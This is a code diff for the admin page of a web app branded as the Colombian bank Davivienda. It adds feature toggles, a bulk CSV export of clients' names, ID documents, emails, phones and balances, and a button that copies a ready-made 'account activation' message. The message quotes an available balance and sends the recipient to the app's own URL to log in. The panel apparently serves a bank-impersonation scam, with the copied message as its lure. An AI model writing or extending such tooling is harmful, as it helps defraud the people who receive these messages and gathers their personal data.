@@ -27,6 +27,10 @@ interface ExtendedTransaction extends Transaction {
 
 interface ExtendedAccount extends Account {
   userName?: string;
+  userEmail?: string;
+  userDocument?: string;
+  userPhone?: string;
+  userUsername?: string;
 }
 
 interface ExtendedCard extends CardType {
@@ -62,6 +66,19 @@ const AdminPage = () => {
   const [checkoutBrandTagline, setCheckoutBrandTagline] = useState("Pasarela de pago segura");
   const [checkoutOwnerName, setCheckoutOwnerName] = useState("");
   const [mobileAppEnabled, setMobileAppEnabled] = useState(false);
+  
+  const [adminFeatures, setAdminFeatures] = useState<Record<string, boolean>>({
+    feature_bank_certificate: false,
+    feature_transfer_limits: false,
+    feature_custom_messages: false,
+    feature_identity_verification: false,
+    feature_promotions: false,
+    feature_account_insurance: false,
+    feature_loyalty_points: false,
+    feature_account_statement: false,
+    feature_scheduled_payments: false,
+    feature_priority_support: false,
+  });
 
   // Estado para audit logs
   interface AuditLogEntry {
@@ -439,6 +456,160 @@ const AdminPage = () => {
         variant: "destructive",
       });
     }
+  };
+
+  const ADMIN_FEATURE_LABELS: Record<string, { name: string; description: string }> = {
+    feature_bank_certificate: { name: "Certificados Bancarios", description: "Permite a los usuarios ver y descargar certificados bancarios desde su perfil" },
+    feature_transfer_limits: { name: "Limites de Transferencia", description: "Muestra los limites diarios de transferencia en la seccion de envios" },
+    feature_custom_messages: { name: "Mensajes Personalizados", description: "Muestra mensajes personalizados del administrador en el dashboard del usuario" },
+    feature_identity_verification: { name: "Verificacion de Identidad", description: "Muestra un badge de verificacion junto al nombre del usuario" },
+    feature_promotions: { name: "Promociones Bancarias", description: "Muestra banners promocionales en el inicio del usuario" },
+    feature_account_insurance: { name: "Seguro de Cuenta", description: "Muestra informacion del seguro de la cuenta en el perfil del usuario" },
+    feature_loyalty_points: { name: "Puntos Davivienda", description: "Muestra los puntos de fidelidad acumulados en el dashboard" },
+    feature_account_statement: { name: "Extracto de Cuenta", description: "Permite a los usuarios generar y descargar extractos de cuenta" },
+    feature_scheduled_payments: { name: "Pagos Programados", description: "Muestra seccion de recordatorios de pagos programados" },
+    feature_priority_support: { name: "Soporte Prioritario", description: "Muestra badge de soporte prioritario y acceso rapido a ayuda" },
+  };
+
+  const handleToggleFeature = async (featureKey: string) => {
+    try {
+      const newValue = !adminFeatures[featureKey];
+      await apiRequest("PUT", "/api/admin/settings/" + featureKey, {
+        value: newValue ? "true" : "false",
+        description: ADMIN_FEATURE_LABELS[featureKey]?.description || featureKey
+      });
+      setAdminFeatures(prev => ({ ...prev, [featureKey]: newValue }));
+      toast({
+        title: "Funcion actualizada",
+        description: `${ADMIN_FEATURE_LABELS[featureKey]?.name} ${newValue ? "activada" : "desactivada"}`,
+      });
+      fetchSettings();
+    } catch (error: any) {
+      toast({
+        title: "Error",
+        description: error?.message || "No se pudo actualizar la funcion",
+        variant: "destructive",
+      });
+    }
+  };
+
+  const fetchAdminFeatures = async () => {
+    try {
+      const featureKeys = Object.keys(adminFeatures);
+      const results: Record<string, boolean> = {};
+      for (const key of featureKeys) {
+        try {
+          const response = await fetch(`/api/settings/${key}`);
+          if (response.ok) {
+            const data = await response.json();
+            results[key] = data.value === "true";
+          } else {
+            results[key] = false;
+          }
+        } catch {
+          results[key] = false;
+        }
+      }
+      setAdminFeatures(results);
+    } catch (error) {
+      console.error("Error fetching admin features:", error);
+    }
+  };
+
+  const copyAccountTemplate = (account: ExtendedAccount) => {
+    const appUrl = window.location.origin;
+    const formattedAccountNumber = account.accountNumber.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
+    const balanceFormatted = formatCurrencyWithCode(account.balance, (account.currency as CurrencyCode) || 'COP');
+    const currencyLabel = CURRENCIES[(account.currency as CurrencyCode) || 'COP']?.code || 'COP';
+    
+    const template = `*ACTIVACION DE CUENTA BANCARIA - DAVIVIENDA*
+
+Estimado *${account.userName || 'Cliente'}*,
+por medio de este mensaje se realiza la entrega de los datos correspondientes a su cuenta bancaria Davivienda, habilitada para su activacion y acceso.
+
+Banco: Davivienda
+Tipo de cuenta: ${account.accountType}
+Numero de cuenta: *${formattedAccountNumber}*
+
+Saldo disponible: ${balanceFormatted} ${currencyLabel}
+Titular: *${account.userName || 'Cliente'}*
+Documento (DNI): ${account.userDocument || 'N/A'}
+Correo electronico: ${account.userEmail || 'N/A'}
+
+*Datos de acceso*
+*Usuario*: ${account.userUsername || 'N/A'}
+*Contrasena*: (la que definio al registrarse)
+
+*Link de acceso Davivienda:*
+${appUrl}
+
+Este enlace le permitira ingresar a su cuenta y realizar la activacion correspondiente.
+
+Quedamos atentos ante cualquier novedad.`;
+
+    navigator.clipboard.writeText(template).then(() => {
+      toast({
+        title: "Plantilla copiada",
+        description: `Plantilla de ${account.userName} copiada al portapapeles`,
+      });
+    }).catch(() => {
+      const textArea = document.createElement('textarea');
+      textArea.value = template;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textArea);
+      toast({
+        title: "Plantilla copiada",
+        description: `Plantilla de ${account.userName} copiada al portapapeles`,
+      });
+    });
+  };
+
+  const downloadAllClientsData = () => {
+    if (users.length === 0 && accounts.length === 0) {
+      toast({
+        title: "Sin datos",
+        description: "Cargue primero los datos de usuarios y cuentas",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    const headers = ["Nombre", "Usuario", "Email", "Documento", "Telefono", "Numero de Cuenta", "Tipo de Cuenta", "Saldo", "Divisa", "Estado"];
+    
+    const rows = accounts.map(acc => {
+      const usr = users.find(u => u.id === acc.userId);
+      return [
+        usr?.name || acc.userName || '',
+        usr?.username || acc.userUsername || '',
+        usr?.email || acc.userEmail || '',
+        usr?.document || acc.userDocument || '',
+        usr?.phone || acc.userPhone || '',
+        acc.accountNumber,
+        acc.accountType,
+        acc.balance.toString(),
+        acc.currency || 'COP',
+        acc.status || 'ACTIVA'
+      ].map(field => `"${(field || '').replace(/"/g, '""')}"`).join(',');
+    });
+
+    const csvContent = [headers.join(','), ...rows].join('\n');
+    const BOM = '\uFEFF';
+    const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `clientes_davivienda_${new Date().toISOString().split('T')[0]}.csv`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+    
+    toast({
+      title: "Descarga iniciada",
+      description: `Archivo con ${accounts.length} cuentas descargado`,
+    });
   };
 
   const fetchAuditLogs = async () => {
@@ -1132,7 +1303,31 @@ const AdminPage = () => {
 
   return (
     <div className="container mx-auto py-6 px-4">
-      <h1 className="text-3xl font-bold text-red-700 mb-6">Panel de Administración</h1>
+      <div className="flex items-center justify-between mb-6">
+        <h1 className="text-3xl font-bold text-red-700">Panel de Administración</h1>
+        <Button
+          data-testid="button-download-clients"
+          variant="outline"
+          size="sm"
+          className="bg-blue-50 text-blue-700 border-blue-200"
+          onClick={() => {
+            if (users.length === 0 || accounts.length === 0) {
+              Promise.all([
+                apiRequest("GET", "/api/admin/users").then(r => r.json()),
+                apiRequest("GET", "/api/admin/accounts").then(r => r.json())
+              ]).then(([usersData, accountsData]) => {
+                setUsers(usersData);
+                setAccounts(accountsData);
+                setTimeout(() => downloadAllClientsData(), 100);
+              });
+            } else {
+              downloadAllClientsData();
+            }
+          }}
+        >
+          Descargar Clientes
+        </Button>
+      </div>
       
       {/* Estado de conexión */}
       <div className={`mb-4 p-3 rounded-md text-center ${isConnected ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}`}>
@@ -1152,7 +1347,7 @@ const AdminPage = () => {
             <TabsTrigger value="alerts">Alertas</TabsTrigger>
             <TabsTrigger value="cobros" onClick={() => { fetchCharges(); fetchAccounts(); fetchUsers(); }}>Cobros & Accesos</TabsTrigger>
             <TabsTrigger value="audit" onClick={fetchAuditLogs} data-testid="tab-audit-logs">Registro de Actividad</TabsTrigger>
-            <TabsTrigger value="settings" onClick={fetchSettings}>Configuración</TabsTrigger>
+            <TabsTrigger value="settings" onClick={() => { fetchSettings(); fetchAdminFeatures(); }}>Configuración</TabsTrigger>
           </TabsList>
         </div>
         
@@ -1462,6 +1657,15 @@ const AdminPage = () => {
                             </Badge>
                           </td>
                           <td className="p-4 space-x-2 flex flex-col sm:flex-row gap-2">
+                            <Button 
+                              variant="outline"
+                              size="sm"
+                              data-testid={`button-copy-template-${account.id}`}
+                              className="bg-purple-50 text-purple-600 hover:bg-purple-100"
+                              onClick={() => copyAccountTemplate(account)}
+                            >
+                              Copiar Plantilla
+                            </Button>
                             <Button 
                               variant="outline"
                               size="sm"
@@ -2067,6 +2271,36 @@ const AdminPage = () => {
                       ? "El botón de instalación está visible para los usuarios" 
                       : "El botón de instalación está oculto"}
                   </span>
+                </div>
+              </div>
+
+              <hr />
+
+              {/* Admin Feature Toggles */}
+              <div className="space-y-4">
+                <h3 className="text-lg font-semibold">Funciones de la Banca</h3>
+                <p className="text-sm text-gray-500">
+                  Active o desactive funciones que seran visibles para los usuarios en su banca movil.
+                </p>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  {Object.entries(ADMIN_FEATURE_LABELS).map(([key, { name, description }]) => (
+                    <div key={key} className="flex items-center justify-between p-3 bg-gray-50 rounded-lg border">
+                      <div className="flex-1 mr-3">
+                        <p className="font-medium text-sm">{name}</p>
+                        <p className="text-xs text-gray-500">{description}</p>
+                      </div>
+                      <Button
+                        data-testid={`button-toggle-${key}`}
+                        size="sm"
+                        onClick={() => handleToggleFeature(key)}
+                        className={adminFeatures[key] 
+                          ? "bg-green-600 hover:bg-green-700 text-white min-w-[100px]" 
+                          : "bg-gray-400 hover:bg-gray-500 text-white min-w-[100px]"}
+                      >
+                        {adminFeatures[key] ? "Activado" : "Desactivado"}
+                      </Button>
+                    </div>
+                  ))}
                 </div>
               </div>
 
